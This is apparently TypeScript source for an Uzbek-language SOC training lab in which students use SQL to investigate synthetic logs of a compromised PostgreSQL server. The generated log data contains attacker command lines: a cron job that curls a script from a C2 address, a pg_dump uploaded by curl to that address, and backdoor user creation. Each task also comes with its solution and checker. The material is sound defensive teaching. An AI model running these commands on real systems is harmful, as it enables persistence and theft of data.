import type { Lab, LabCheckCtx } from '../types';
import { prng } from './siem';
import { column, expectRows, hasRows, inserts, lastResult, queryDb, sameSet } from './sqlHelpers';

/* ── 2. SQL for the SOC: a database server compromise ────────────────── */

const DIR = '/home/talaba/soc';
const DB = `${DIR}/soc.db`;
const VICTIM = 'srv-db-01';
const BRUTE = '198.51.100.77';
const C2 = '203.0.113.88';

type Cell = string | number | null;

function socScript(): string {
  const rnd = prng(1901);
  const pad = (n: number) => String(n).padStart(2, '0');
  const ts = (h: number, m: number, s: number) => `2026-11-19 ${pad(h)}:${pad(m)}:${pad(s)}`;
  const at = (sec: number) => ts(Math.floor(sec / 3600), Math.floor((sec % 3600) / 60), sec % 60);

  const assets: Cell[][] = [
    ['srv-db-01', '10.10.40.21', 'b.ergashev', 'IT', 'high'],
    ['srv-db-02', '10.10.40.22', 'b.ergashev', 'IT', 'high'],
    ['srv-web-01', '10.10.30.11', 'j.tursunov', 'IT', 'high'],
    ['srv-app-01', '10.10.30.12', 'j.tursunov', 'IT', 'medium'],
    ['srv-backup-01', '10.10.40.30', 'b.ergashev', 'IT', 'medium'],
    ['ws-it-002', '10.10.30.50', 'j.tursunov', 'IT', 'low'],
    ['ws-bux-003', '10.10.10.12', 'z.yusupova', 'Buxgalteriya', 'low'],
    ['ws-hr-005', '10.10.20.15', 'd.qosimova', 'HR', 'low'],
  ];
  const ipOf = (h: string) => String(assets.find((a) => a[0] === h)![1]);
  const servers = ['srv-db-01', 'srv-db-02', 'srv-web-01', 'srv-app-01', 'srv-backup-01'];

  const auth: Cell[][] = [];
  const proc: Cell[][] = [];
  const net: Cell[][] = [];

  // Ordinary night and morning: admins log in with keys, cron jobs run, servers talk to the backup host and mirrors.
  for (const host of servers) {
    for (let k = 0; k < 6; k++) {
      const t = 3600 * 6 + Math.floor(rnd() * 3600 * 4);
      auth.push([at(t), host, k % 2 ? 'j.tursunov' : 'b.ergashev', '10.10.30.50', 'publickey', 'success']);
      proc.push([at(t + 20), host, k % 2 ? 'j.tursunov' : 'b.ergashev', '/usr/bin/sudo', 'sudo systemctl status postgresql', '/bin/bash']);
    }
    for (let m = 0; m < 24 * 60; m += 60) {
      if (m < 60 * 6 || m > 60 * 9) continue;
      proc.push([at(m * 60 + 1), host, 'root', '/usr/sbin/logrotate', '/usr/sbin/logrotate /etc/logrotate.conf', '/usr/sbin/cron']);
    }
    for (let k = 0; k < 30; k++) {
      const t = Math.floor(rnd() * 3600 * 10);
      const backup = rnd() < 0.5;
      net.push([at(t), host, ipOf(host), backup ? '10.10.40.30' : '192.0.2.50', backup ? 873 : 443, backup ? 200_000 + Math.floor(rnd() * 900_000) : 2_000 + Math.floor(rnd() * 8_000), backup ? 4_000 : 900_000 + Math.floor(rnd() * 4_000_000)]);
    }
  }
  // Workstations browse; one HR machine opens a site that is not in the IOC list (noise).
  for (const host of ['ws-it-002', 'ws-bux-003', 'ws-hr-005']) {
    for (let k = 0; k < 25; k++) net.push([at(3600 * 6 + Math.floor(rnd() * 3600 * 4)), host, ipOf(host), ['198.51.100.14', '192.0.2.44', '192.0.2.71'][k % 3]!, 443, 1_000 + Math.floor(rnd() * 30_000), 20_000 + Math.floor(rnd() * 400_000)]);
  }
  // A few typos from admins.
  auth.push([ts(7, 2, 11), 'srv-web-01', 'j.tursunov', '10.10.30.50', 'password', 'fail'], [ts(7, 2, 19), 'srv-web-01', 'j.tursunov', '10.10.30.50', 'publickey', 'success']);

  // 01:10–01:31 — password guessing over SSH against srv-db-01, then the backup account gets in.
  const tried = ['root', 'admin', 'postgres', 'backup', 'ubuntu', 'test', 'oracle', 'deploy', 'git', 'user'];
  let t = 3600 + 600;
  for (let i = 0; i < 84; i++) {
    t += 8 + Math.floor(rnd() * 8);
    auth.push([at(t), VICTIM, tried[i % tried.length]!, BRUTE, 'password', 'fail']);
  }
  // The same address knocks on srv-web-01 a few times too, and gives up.
  for (let i = 0; i < 6; i++) auth.push([ts(1, 40, 3 + i * 9), 'srv-web-01', 'root', BRUTE, 'password', 'fail']);
  const IN = 3600 + 31 * 60 + 12;
  auth.push([at(IN), VICTIM, 'backup', BRUTE, 'password', 'success']);
  // What the intruder did.
  const steps: [number, string, string, string, string][] = [
    [20, 'backup', '/usr/bin/id', 'id', '/bin/bash'],
    [34, 'backup', '/usr/bin/uname', 'uname -a', '/bin/bash'],
    [61, 'backup', '/usr/bin/sudo', 'sudo -l', '/bin/bash'],
    [140, 'root', '/usr/sbin/useradd', 'useradd -m -s /bin/bash support', '/usr/bin/sudo'],
    [151, 'root', '/usr/sbin/usermod', 'usermod -aG sudo support', '/usr/bin/sudo'],
    [240, 'root', '/usr/bin/crontab', `crontab -l ; echo "*/10 * * * * curl -s http://${C2}/u.sh -o /tmp/.u" | crontab -`, '/usr/bin/sudo'],
    [2400, 'root', '/usr/bin/pg_dump', 'pg_dump -U postgres qaydnoma -f /tmp/.q.sql', '/usr/bin/sudo'],
    [2460, 'root', '/bin/tar', 'tar czf /tmp/.q.tgz /tmp/.q.sql', '/usr/bin/sudo'],
    [2500, 'root', '/usr/bin/curl', `curl -s -T /tmp/.q.tgz https://${C2}/up`, '/usr/bin/sudo'],
    [2560, 'root', '/bin/rm', 'rm -f /tmp/.q.sql /tmp/.q.tgz', '/usr/bin/sudo'],
  ];
  for (const [dt, user, image, cmd, parent] of steps) proc.push([at(IN + dt), VICTIM, user, image, cmd, parent]);
  // The cron job calls home every 600 s from 01:40 until morning.
  for (let s = 3600 + 40 * 60; s < 3600 * 9; s += 600) {
    proc.push([at(s), VICTIM, 'root', '/usr/bin/curl', `curl -s http://${C2}/u.sh -o /tmp/.u`, '/usr/sbin/cron']);
    net.push([at(s), VICTIM, ipOf(VICTIM), C2, 80, 310, 1_200]);
  }
  // 02:13 — the database dump goes out.
  net.push([at(IN + 2500), VICTIM, ipOf(VICTIM), C2, 443, 52_428_800, 6_000]);
  // The intruder's SSH session itself.
  net.push([at(IN), VICTIM, BRUTE, ipOf(VICTIM), 22, 48_000, 310_000]);

  auth.sort((a, b) => String(a[0]).localeCompare(String(b[0])));
  proc.sort((a, b) => String(a[0]).localeCompare(String(b[0])));
  net.sort((a, b) => String(a[0]).localeCompare(String(b[0])));

  const ioc: Cell[][] = [
    [C2, 'ip', 'Staging/C2 server (TI feed 2026-11-15)'],
    [BRUTE, 'ip', 'SSH brute force scanner'],
    ['198.51.100.200', 'ip', 'Scanner'],
    ['update-check.example-cdn.net', 'domain', 'WS-BUX-014 kampaniyasi'],
  ];

  return [
    'CREATE TABLE assets (host TEXT PRIMARY KEY, ip TEXT, owner TEXT, dept TEXT, criticality TEXT);',
    'CREATE TABLE auth_log (id INTEGER PRIMARY KEY, ts TEXT, host TEXT, user TEXT, src_ip TEXT, method TEXT, result TEXT);',
    'CREATE TABLE proc_events (id INTEGER PRIMARY KEY, ts TEXT, host TEXT, user TEXT, image TEXT, cmdline TEXT, parent TEXT);',
    'CREATE TABLE net_events (id INTEGER PRIMARY KEY, ts TEXT, host TEXT, src_ip TEXT, dst_ip TEXT, dst_port INTEGER, bytes_out INTEGER, bytes_in INTEGER);',
    'CREATE TABLE ioc (indicator TEXT PRIMARY KEY, type TEXT, description TEXT);',
    inserts('assets', ['host', 'ip', 'owner', 'dept', 'criticality'], assets),
    inserts('auth_log', ['ts', 'host', 'user', 'src_ip', 'method', 'result'], auth),
    inserts('proc_events', ['ts', 'host', 'user', 'image', 'cmdline', 'parent'], proc),
    inserts('net_events', ['ts', 'host', 'src_ip', 'dst_ip', 'dst_port', 'bytes_out', 'bytes_in'], net),
    inserts('ioc', ['indicator', 'type', 'description'], ioc),
  ].join('\n');
}

const SOC_SQL = socScript();
const QUERY = '-- Tergov so\'rovlari. Bajarish: sqlite3 -box soc.db ".read tergov.sql"\n\nSELECT * FROM assets;\n';

const exp = (c: LabCheckCtx, sql: string) => expectRows(c.state, DB, sql);
const first = (c: LabCheckCtx, sql: string) => exp(c, sql).map((r) => r[0]!);
const R = (sql: string) => [`echo "${sql}" > tergov.sql`, 'sqlite3 -box soc.db ".read tergov.sql"'];

const LAG_SQL = `SELECT ts, (julianday(ts) - julianday(LAG(ts) OVER (ORDER BY ts))) * 86400 AS oraliq FROM net_events WHERE host = '${VICTIM}' AND dst_ip = '${C2}' AND dst_port = 80`;

export const socSql: Lab = {
  id: 'sql-soc',
  title: 'SOC uchun SQL: ma\'lumotlar bazasi serveri buzilgan',
  summary: "Log jadvallarida tergov: SSH parol hujumi, kirib olingan hisob, yangi foydalanuvchi va cron, IOC'lar bilan JOIN, LAG bilan beacon oralig'i, chiqib ketgan hajm, CASE, CTE va UNION ALL bilan yagona vaqt chizig'i.",
  minutes: 80,
  level: 2,
  panes: ['terminal', 'editor'],
  editor: { root: DIR, open: 'tergov.sql' },
  runtimes: ['sql'],
  intro:
    "2026-yil 19-noyabr ertalab monitoring `srv-db-01` (PostgreSQL serveri) tunda tashqariga katta hajm yuborganini ko'rsatdi. Log yig'uvchi tizim ma'lumotlarni SQLite bazasiga yozadi: `~/soc/soc.db`.\n\n" +
    "Jadvallar: `assets` (qurilmalar, egasi, muhimligi), `auth_log` (SSH kirishlari), `proc_events` (ishga tushgan buyruqlar), `net_events` (tarmoq ulanishlari, `bytes_out` — chiqqan bayt), `ioc` (tahdid ko'rsatkichlari). Vaqtlar UTC, `'YYYY-MM-DD HH:MM:SS'` matn ko'rinishida — shuning uchun ularni oddiy solishtirish va saralash to'g'ri ishlaydi.\n\n" +
    "SIEM labida xuddi shu savollarni SPL bilan berdingiz; SQL — ko'p SOC vositalari (osquery, Microsoft Defender'ning ilgari ishlatgan so'rovlari, ko'plab log omborlari) gapiradigan til. Uzun so'rovlarni **Kod** oynasida `tergov.sql` ga yozing.",
  shell: () => ({
    host: 'soc-ws',
    fs: { home: { talaba: { soc: { 'tergov.sql': QUERY } } }, tmp: {} },
    sqlite: { [DB]: SOC_SQL },
    cwd: DIR,
  }),
  tasks: [
    {
      id: 'tables',
      teach: ['sqlite3', 'sqlite3 .tables', 'sqlite3 .schema'],
      text: "Bazadagi jadvallarni va `net_events` tuzilishini ko'ring.",
      hint: '`sqlite3 soc.db ".tables"`, keyin `sqlite3 soc.db ".schema net_events"`',
      solution: ['sqlite3 soc.db ".tables"', 'sqlite3 soc.db ".schema net_events"'],
      check: ({ output }) => output.startsWith('CREATE TABLE net_events'),
    },
    {
      id: 'fails',
      teach: ['sql:group', 'sql:group COUNT', 'sql:order DESC'],
      text: "Muvaffaqiyatsiz SSH kirishlari (`result` = fail) qaysi manzildan va qaysi serverga eng ko'p bo'lgan? `src_ip` va `host` bo'yicha sanang.",
      hint: "`sqlite3 -box soc.db \"SELECT src_ip, host, COUNT(*) AS n FROM auth_log WHERE result = 'fail' GROUP BY src_ip, host ORDER BY n DESC;\"`",
      solution: ["sqlite3 -box soc.db \"SELECT src_ip, host, COUNT(*) AS n FROM auth_log WHERE result = 'fail' GROUP BY src_ip, host ORDER BY n DESC;\""],
      check: (c) => hasRows(lastResult(c), exp(c, "SELECT src_ip, host, COUNT(*) FROM auth_log WHERE result = 'fail' GROUP BY src_ip, host ORDER BY 3 DESC LIMIT 2")),
    },
    {
      id: 'distinct',
      teach: ['sql:select DISTINCT'],
      text: `\`${BRUTE}\` qaysi hisoblarni sinagan? Takrorsiz ro'yxat.`,
      hint: `\`sqlite3 soc.db "SELECT DISTINCT user FROM auth_log WHERE src_ip = '${BRUTE}';"\``,
      solution: [`sqlite3 soc.db "SELECT DISTINCT user FROM auth_log WHERE src_ip = '${BRUTE}';"`],
      check: (c) => sameSet(column(lastResult(c), 'user'), first(c, `SELECT DISTINCT user FROM auth_log WHERE src_ip = '${BRUTE}'`)),
    },
    {
      id: 'between',
      teach: ['sql:where BETWEEN'],
      text: "Hujum oynasi: `srv-db-01` ga 01:00 dan 02:00 gacha bo'lgan barcha kirish urinishlari soni, natija bo'yicha.",
      hint: "`... WHERE host = 'srv-db-01' AND ts BETWEEN '2026-11-19 01:00:00' AND '2026-11-19 02:00:00' GROUP BY result;`",
      solution: [`sqlite3 -box soc.db "SELECT result, COUNT(*) FROM auth_log WHERE host = '${VICTIM}' AND ts BETWEEN '2026-11-19 01:00:00' AND '2026-11-19 02:00:00' GROUP BY result;"`],
      check: (c) => hasRows(lastResult(c), exp(c, `SELECT result, COUNT(*) FROM auth_log WHERE host = '${VICTIM}' AND ts BETWEEN '2026-11-19 01:00:00' AND '2026-11-19 02:00:00' GROUP BY result`)),
    },
    {
      id: 'success',
      text: 'Shu manzildan **muvaffaqiyatli** kirish bormi? Qachon, qaysi serverga, qaysi hisob va qanday usul (`method`) bilan?',
      hint: `\`sqlite3 -box soc.db "SELECT ts, host, user, method FROM auth_log WHERE src_ip = '${BRUTE}' AND result = 'success';"\` — parol bilan: hisobda kalit o'rniga parol ruxsat etilgan ekan.`,
      solution: [`sqlite3 -box soc.db "SELECT ts, host, user, method FROM auth_log WHERE src_ip = '${BRUTE}' AND result = 'success';"`],
      check: (c) => hasRows(lastResult(c), [['backup', 'password']]) && lastResult(c)?.rows.length === 1,
    },
    {
      id: 'rate',
      teach: ['sql:date', 'sql:date strftime'],
      text: "Hujum tezligi: `srv-db-01` ga muvaffaqiyatsiz urinishlarni daqiqa bo'yicha (`strftime('%H:%M', ts)`) sanang — birinchi 5 daqiqani ko'rsating.",
      hint: "`SELECT strftime('%H:%M', ts) AS daqiqa, COUNT(*) FROM auth_log WHERE host = 'srv-db-01' AND result = 'fail' GROUP BY daqiqa ORDER BY daqiqa LIMIT 5;`",
      solution: R(`SELECT strftime('%H:%M', ts) AS daqiqa, COUNT(*) AS n FROM auth_log WHERE host = '${VICTIM}' AND result = 'fail' GROUP BY daqiqa ORDER BY daqiqa LIMIT 5;`),
      check: (c) => lastResult(c)?.rows.length === 5 && hasRows(lastResult(c), exp(c, `SELECT strftime('%H:%M', ts), COUNT(*) FROM auth_log WHERE host = '${VICTIM}' AND result = 'fail' GROUP BY 1 ORDER BY 1 LIMIT 5`)),
    },
    {
      id: 'after',
      teach: ['sqlite3 .read'],
      text: "Kirgandan keyin nima qilingan? **Kod** oynasida `srv-db-01` dagi 01:31:12 dan keyingi jarayonlarni vaqt bo'yicha chiqaradigan so'rov yozing (`ts, user, cmdline`), cron'ning takrorlanuvchi `curl` qatorlarini (`parent` = /usr/sbin/cron) chiqarib tashlang.",
      hint: "`SELECT ts, user, cmdline FROM proc_events WHERE host = 'srv-db-01' AND ts >= '2026-11-19 01:31:12' AND parent != '/usr/sbin/cron' ORDER BY ts;` — keyin `sqlite3 -box soc.db \".read tergov.sql\"`",
      solution: R(`SELECT ts, user, cmdline FROM proc_events WHERE host = '${VICTIM}' AND ts >= '2026-11-19 01:31:12' AND parent != '/usr/sbin/cron' ORDER BY ts;`),
      check: (c) => {
        const cmds = column(lastResult(c), 'cmdline') ?? [];
        return c.line.includes('.read') && cmds.some((x) => x.startsWith('useradd')) && cmds.some((x) => x.startsWith('pg_dump')) && !cmds.some((x) => x.startsWith('curl -s http://'));
      },
    },
    {
      id: 'useradd',
      teach: ['sql:like'],
      text: "Butun muhitda yangi foydalanuvchi yaratilganmi yoki guruhga qo'shilganmi? `cmdline` da `useradd` yoki `usermod` bo'lgan barcha jarayonlar — qaysi serverda?",
      hint: "`SELECT ts, host, cmdline FROM proc_events WHERE cmdline LIKE '%useradd%' OR cmdline LIKE '%usermod%';`",
      solution: R("SELECT ts, host, cmdline FROM proc_events WHERE cmdline LIKE '%useradd%' OR cmdline LIKE '%usermod%';"),
      check: (c) => lastResult(c)?.rows.length === 2 && sameSet([...new Set(column(lastResult(c), 'host') ?? [])], [VICTIM]),
    },
    {
      id: 'ioc-join',
      teach: ['sql:join', 'sql:join ON'],
      text: "Tarmoq ulanishlarini `ioc` jadvali bilan solishtiring: manzili (`dst_ip`) IOC ro'yxatida bo'lgan ulanishlar soni — qurilma, manzil va IOC tavsifi bo'yicha.",
      hint: '`SELECT n.host, n.dst_ip, i.description, COUNT(*) AS n FROM net_events n JOIN ioc i ON n.dst_ip = i.indicator GROUP BY n.host, n.dst_ip;`',
      solution: R('SELECT n.host, n.dst_ip, i.description, COUNT(*) AS soni FROM net_events n JOIN ioc i ON n.dst_ip = i.indicator GROUP BY n.host, n.dst_ip;'),
      check: (c) => hasRows(lastResult(c), exp(c, 'SELECT n.host, n.dst_ip, COUNT(*) FROM net_events n JOIN ioc i ON n.dst_ip = i.indicator GROUP BY n.host, n.dst_ip')),
    },
    {
      id: 'scope',
      text: `Qamrov: C2 manzili \`${C2}\` ga **boshqa** qurilmalar ham ulanganmi? Barcha qurilmalar bo'yicha ulanishlar soni.`,
      hint: `\`sqlite3 -box soc.db "SELECT host, COUNT(*) FROM net_events WHERE dst_ip = '${C2}' GROUP BY host;"\` — faqat srv-db-01.`,
      solution: [`sqlite3 -box soc.db "SELECT host, COUNT(*) FROM net_events WHERE dst_ip = '${C2}' GROUP BY host;"`],
      check: (c) => sameSet(column(lastResult(c), 'host'), [VICTIM]),
    },
    {
      id: 'lag',
      teach: ['sql:window', 'sql:window LAG', 'sql:date julianday'],
      text: "Beacon oralig'i: srv-db-01 dan C2 ga 80-portdagi ulanishlar orasidagi soniyalarni `LAG` oyna funksiyasi bilan hisoblang.",
      hint: `\`${LAG_SQL};\` — har qatorda 600: cron har 10 daqiqada ishga tushadi.`,
      solution: R(`${LAG_SQL};`),
      check: (c) => {
        const v = (column(lastResult(c), 'oraliq') ?? column(lastResult(c), 1) ?? []).filter((x) => x !== '');
        return v.length > 5 && v.every((x) => Math.round(Number(x)) === 600);
      },
    },
    {
      id: 'volume',
      teach: ['sql:group SUM'],
      text: "Qancha ma'lumot chiqib ketgan? srv-db-01 dan har bir tashqi manzilga yuborilgan jami baytni MB da (1 MB = 1048576) chiqaring, eng kattasidan.",
      hint: "`SELECT dst_ip, ROUND(SUM(bytes_out) / 1048576.0, 1) AS mb FROM net_events WHERE host = 'srv-db-01' AND dst_ip NOT LIKE '10.%' GROUP BY dst_ip ORDER BY mb DESC;` — `1048576.0` (nuqta bilan): butun songa bo'lsangiz, SQLite kasrni tashlab yuboradi.",
      solution: R(`SELECT dst_ip, ROUND(SUM(bytes_out) / 1048576.0, 1) AS mb FROM net_events WHERE host = '${VICTIM}' AND dst_ip NOT LIKE '10.%' GROUP BY dst_ip ORDER BY mb DESC;`),
      check: (c) => (column(lastResult(c), 0) ?? [])[0] === C2 && hasRows(lastResult(c), exp(c, `SELECT dst_ip, ROUND(SUM(bytes_out) / 1048576.0, 1) FROM net_events WHERE host = '${VICTIM}' AND dst_ip = '${C2}' GROUP BY dst_ip`)),
    },
    {
      id: 'case',
      teach: ['sql:case', 'sql:case WHEN'],
      text: "`CASE` bilan srv-db-01 ning chiquvchi ulanishlarini toifalang: `ichki` (`10.` bilan boshlanadi), `ioc` (IOC ro'yxatida), qolgani `tashqi`. Har toifada ulanishlar soni va jami MB.",
      hint: "`SELECT CASE WHEN dst_ip LIKE '10.%' THEN 'ichki' WHEN dst_ip IN (SELECT indicator FROM ioc) THEN 'ioc' ELSE 'tashqi' END AS toifa, COUNT(*), ROUND(SUM(bytes_out)/1048576.0, 1) FROM net_events WHERE host = 'srv-db-01' AND src_ip = '10.10.40.21' GROUP BY toifa;`",
      solution: R("SELECT CASE WHEN dst_ip LIKE '10.%' THEN 'ichki' WHEN dst_ip IN (SELECT indicator FROM ioc) THEN 'ioc' ELSE 'tashqi' END AS toifa, COUNT(*) AS soni, ROUND(SUM(bytes_out) / 1048576.0, 1) AS mb FROM net_events WHERE host = 'srv-db-01' AND src_ip = '10.10.40.21' GROUP BY toifa;"),
      check: (c) => hasRows(lastResult(c), exp(c, "SELECT CASE WHEN dst_ip LIKE '10.%' THEN 'ichki' WHEN dst_ip IN (SELECT indicator FROM ioc) THEN 'ioc' ELSE 'tashqi' END, COUNT(*) FROM net_events WHERE host = 'srv-db-01' AND src_ip = '10.10.40.21' GROUP BY 1")),
    },
    {
      id: 'timeline',
      teach: ['sql:subquery WITH', 'sql:subquery UNION ALL'],
      text: "Yagona vaqt chizig'i: `WITH` va `UNION ALL` bilan srv-db-01 dagi uch manbani birlashtiring — 01:31:00 dan 02:20:00 gacha: `ts`, `manba` ('auth', 'proc' yoki 'net'), `tafsilot` (user, cmdline yoki dst_ip:dst_port). Cron `curl` qatorlarini va 80-portdagi beacon'larni chiqarmang; vaqt bo'yicha saralang.",
      hint: "`WITH t AS (SELECT ts, 'auth' AS manba, user || ' ' || result AS tafsilot FROM auth_log WHERE host = 'srv-db-01' AND result = 'success' UNION ALL SELECT ts, 'proc', cmdline FROM proc_events WHERE host = 'srv-db-01' AND parent != '/usr/sbin/cron' UNION ALL SELECT ts, 'net', dst_ip || ':' || dst_port FROM net_events WHERE host = 'srv-db-01' AND dst_port != 80) SELECT * FROM t WHERE ts BETWEEN '2026-11-19 01:31:00' AND '2026-11-19 02:20:00' ORDER BY ts;` — `||` matnlarni ulaydi.",
      solution: R("WITH t AS (SELECT ts, 'auth' AS manba, user || ' ' || result AS tafsilot FROM auth_log WHERE host = 'srv-db-01' AND result = 'success' UNION ALL SELECT ts, 'proc', cmdline FROM proc_events WHERE host = 'srv-db-01' AND parent != '/usr/sbin/cron' UNION ALL SELECT ts, 'net', dst_ip || ':' || dst_port FROM net_events WHERE host = 'srv-db-01' AND dst_port != 80) SELECT * FROM t WHERE ts BETWEEN '2026-11-19 01:31:00' AND '2026-11-19 02:20:00' ORDER BY ts;"),
      check: (c) => {
        const r = lastResult(c);
        const m = column(r, 'manba') ?? column(r, 1) ?? [];
        const ts = column(r, 'ts') ?? column(r, 0) ?? [];
        return ['auth', 'proc', 'net'].every((x) => m.includes(x)) && ts.every((x, i) => i === 0 || ts[i - 1]! <= x) && (r?.rows.length ?? 0) >= 12;
      },
    },
    {
      id: 'index',
      teach: ['sql:index', 'sqlite3 .indexes'],
      text: "Tergov so'rovlari ko'pincha `dst_ip` bo'yicha qidiradi. `net_events(dst_ip)` ga indeks yarating va `.indexes` bilan tekshiring.",
      hint: '`sqlite3 soc.db "CREATE INDEX idx_net_dst ON net_events(dst_ip);"`, keyin `sqlite3 soc.db ".indexes net_events"`',
      solution: ['sqlite3 soc.db "CREATE INDEX idx_net_dst ON net_events(dst_ip);"', 'sqlite3 soc.db ".indexes net_events"'],
      check: (c) => queryDb(c.state, DB, "SELECT COUNT(*) FROM sqlite_master WHERE type = 'index' AND tbl_name = 'net_events' AND sql LIKE '%dst_ip%'").rows[0]?.[0] === 1 && c.line.includes('.ind'),
    },
    {
      id: 'challenge',
      challenge: true,
      text: "Mustaqil vazifa. IOC manziliga kamida bir marta ulangan **har bir** qurilma uchun bitta qator: `host`, egasi (`owner`), muhimligi (`criticality`), IOC'larga ulanishlar soni, birinchi va oxirgi ulanish vaqti, IOC'larga jami yuborilgan MB (1 xona). Ma'lumot `assets`, `net_events` va `ioc` dan.",
      hint: "net_events ni ioc bilan (`dst_ip = indicator`) va assets bilan (`host`) JOIN qiling, `GROUP BY host`; `COUNT(*)`, `MIN(ts)`, `MAX(ts)`, `ROUND(SUM(bytes_out) / 1048576.0, 1)`.",
      solution: R('SELECT a.host, a.owner, a.criticality, COUNT(*) AS ulanishlar, MIN(n.ts) AS birinchi, MAX(n.ts) AS oxirgi, ROUND(SUM(n.bytes_out) / 1048576.0, 1) AS mb FROM net_events n JOIN ioc i ON n.dst_ip = i.indicator JOIN assets a ON a.host = n.host GROUP BY a.host;'),
      check: (c) => {
        const want = exp(c, 'SELECT a.host, a.owner, a.criticality, COUNT(*), MIN(n.ts), MAX(n.ts), ROUND(SUM(n.bytes_out) / 1048576.0, 1) FROM net_events n JOIN ioc i ON n.dst_ip = i.indicator JOIN assets a ON a.host = n.host GROUP BY a.host');
        const r = lastResult(c);
        return !!r && r.rows.length === want.length && hasRows(r, want);
      },
    },
  ],
};
